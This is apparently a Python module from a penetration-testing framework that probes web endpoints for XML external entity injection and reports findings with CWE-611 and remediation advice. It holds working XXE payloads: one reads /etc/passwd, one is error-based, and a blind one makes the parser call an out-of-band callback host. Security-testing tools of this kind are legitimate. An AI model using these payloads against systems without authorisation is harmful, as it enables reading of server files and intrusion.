"""PENTRIX ARSENAL module: blind XXE prober.

POSTs XML documents to the target URL with three payload classes:

1. Classic XXE: external entity pointing at file:///etc/passwd; flags
   when the passwd canary appears in the response.
2. Error-based XXE: external entity pointing at a nonexistent canary
   file; flags when the response leaks parser errors mentioning it.
3. Blind XXE: parameter entity pointing at the operator's callback URL.
   When a blind base is configured the module waits and correlates
   inbox hits; otherwise it reports "needs OOB confirmation" with the
   exact payload to use manually.

Safe: no exfiltration channel is built beyond the canary markers, and
blind payloads only phone home to the operator's own listener.

Non-intrusive: a few small POSTs.
"""

import time
import urllib.parse
from pathlib import Path
import json

from arsenal.findings import make_finding
from arsenal.http import fetch

NAME = "xxe"
DESCRIPTION = (
    "Tests for XML external entity injection with classic, error-based, "
    "and blind (OOB callback) payloads."
)
TARGET_KIND = "url"
INTRUSIVE = False

TIMEOUT = 10

CLASSIC_XXE = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    "<r>&xxe;</r>"
)
ERROR_XXE = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///arsenal-no-such-file-xyz">]>'
    "<r>&xxe;</r>"
)
BLIND_XXE_TMPL = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE r [<!ENTITY %% a SYSTEM "%s"> %%a;]>'
    "<r>1</r>"
)

PASSWD_MARKER = "root:x:0:0"
ERROR_MARKERS = (
    "SAXParseException", "parser error", "XMLSyntaxError", "libxml",
    "arsenal-no-such-file-xyz", "Entity 'xxe'", "DOCTYPE",
)


def _timeout(ctx):
    cfg = getattr(ctx, "config", None)
    if isinstance(cfg, dict):
        return cfg.get("timeout", TIMEOUT)
    if cfg is not None:
        return getattr(cfg, "timeout", TIMEOUT)
    return TIMEOUT


def _log(ctx, level, msg):
    log = getattr(ctx, "log", None)
    if log is None:
        return
    try:
        getattr(log, level, log.warning)(msg)
    except Exception:
        pass


def _is_http_url(target):
    try:
        parts = urllib.parse.urlsplit(target)
    except Exception:
        return False
    return parts.scheme in ("http", "https") and bool(parts.netloc)


def _host_of(url):
    try:
        return urllib.parse.urlsplit(url).hostname or ""
    except Exception:
        return ""


def _in_scope(target, ctx):
    scope = getattr(ctx, "scope", None)
    if scope is None:
        return True
    try:
        return bool(scope.contains(_host_of(target)))
    except Exception:
        return True


def _finding(**kwargs):
    kwargs.setdefault("module", NAME)
    return make_finding(**kwargs)


def _blind_base(ctx):
    cfg = getattr(ctx, "config", None)
    if isinstance(cfg, dict):
        return cfg.get("blind_base") or cfg.get("oob_base")
    return getattr(ctx, "blind_base", None)


def _inbox_hits(tag, since):
    path = Path.home() / ".arsenal" / "inbox.jsonl"
    try:
        lines = path.read_text(encoding="utf-8").splitlines()
    except Exception:
        return False
    for line in lines[-200:]:
        try:
            rec = json.loads(line)
        except Exception:
            continue
        hay = "%s %s" % (rec.get("path", ""), rec.get("query", ""))
        if tag in hay and str(rec.get("ts", "")) >= since:
            return True
    return False


def _post_xml(url, ctx, payload):
    try:
        return fetch(url, method="POST", timeout=_timeout(ctx),
                     headers={"Content-Type": "application/xml"},
                     data=payload.encode("utf-8"),
                     allow_redirects=True, ctx=ctx)
    except Exception as exc:
        _log(ctx, "debug", "%s: request failed for %s: %s" % (NAME, url, exc))
        return None


def _body_text(resp):
    _status, _headers, body, _final = resp
    try:
        return body.decode("utf-8", errors="replace")
    except Exception:
        return ""


def run(target, ctx):
    """Probe the target for XXE."""
    try:
        return _run(target, ctx)
    except Exception as exc:
        _log(ctx, "warning", "%s failed on %s: %s" % (NAME, target, exc))
        return []


def _run(target, ctx):
    if not _is_http_url(target):
        return []
    if not _in_scope(target, ctx):
        _log(ctx, "warning", "%s: target out of scope: %s" % (NAME, target))
        return []
    findings = []
    base = _blind_base(ctx)

    # Baseline: does the endpoint accept XML at all?
    baseline = _post_xml(target, ctx, "<r>arsenal-baseline</r>")
    baseline_text = _body_text(baseline) if baseline else ""
    if baseline is None:
        return []

    # 1. Classic XXE with file:///etc/passwd canary.
    resp = _post_xml(target, ctx, CLASSIC_XXE)
    if resp is not None:
        text = _body_text(resp)
        if PASSWD_MARKER in text and PASSWD_MARKER not in baseline_text:
            findings.append(_finding(
                target=target,
                severity="high",
                title="XXE: external entity resolved /etc/passwd",
                description=(
                    "The XML parser resolved an external entity pointing at "
                    "file:///etc/passwd and reflected the passwd canary in "
                    "the response. External entities are enabled."),
                evidence=(
                    "Request: POST %s Content-Type: application/xml\n"
                    "Payload: %s\nResponse excerpt: %s"
                    % (target, CLASSIC_XXE, text[:300].replace("\n", " "))),
                confidence="strong",
                cwe="CWE-611",
                remediation=(
                    "Disable DTDs and external entities in the XML parser "
                    "(e.g. disallow-doctype-decl, external-general-entities "
                    "false); prefer JSON or a hardened parser.")))

    # 2. Error-based XXE.
    resp = _post_xml(target, ctx, ERROR_XXE)
    if resp is not None:
        text = _body_text(resp)
        markers = [m for m in ERROR_MARKERS
                   if m in text and m not in baseline_text]
        if markers:
            findings.append(_finding(
                target=target,
                severity="medium",
                title="Possible error-based XXE (parser error leak)",
                description=(
                    "An external entity pointing at a nonexistent file "
                    "triggered parser error output naming the entity, which "
                    "shows the parser processes external entities. Confirm "
                    "with a blind callback."),
                evidence=(
                    "Request: POST %s Content-Type: application/xml\n"
                    "Payload: %s\nError markers: %s"
                    % (target, ERROR_XXE, ", ".join(markers))),
                confidence="review",
                cwe="CWE-611",
                remediation="Same as above: disable DTD/external entities."))

    # 3. Blind XXE via parameter entity to the callback URL.
    tag = "xxe-blind"
    if base:
        cb = "%s/%s" % (str(base).rstrip("/"), tag)
        payload = BLIND_XXE_TMPL % cb
        since = time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime())
        _post_xml(target, ctx, payload)
        time.sleep(6)
        if _inbox_hits(tag, since):
            findings.append(_finding(
                target=target,
                severity="high",
                title="Blind XXE confirmed via OOB callback",
                description=(
                    "The XML parser resolved a parameter entity pointing at "
                    "the operator-controlled callback URL; the outbound "
                    "request was recorded in the arsenal inbox."),
                evidence=(
                    "Request: POST %s Content-Type: application/xml\n"
                    "Payload: %s\nCallback-Tag: %s\n"
                    "Inbox hit recorded after injection."
                    % (target, payload, tag)),
                confidence="strong",
                cwe="CWE-611",
                remediation="Disable DTDs and external entities."))
    else:
        payload = BLIND_XXE_TMPL % "http://YOUR-CALLBACK/xxe-blind"
        findings.append(_finding(
            target=target,
            severity="info",
            title="Blind XXE needs OOB confirmation",
            description=(
                "No blind callback base is configured, so blind XXE could "
                "not be confirmed automatically. POST the payload below "
                "with Content-Type: application/xml, replacing "
                "YOUR-CALLBACK with your collaborator/inbox URL, and watch "
                "for the inbound request."),
            evidence=(
                "Request: POST %s Content-Type: application/xml\n"
                "Exact payload to use:\n%s" % (target, payload)),
            confidence="review",
            cwe="CWE-611",
            remediation=(
                "Set blind_base in the run config to let the module confirm "
                "blind XXE automatically.")))
    return findings
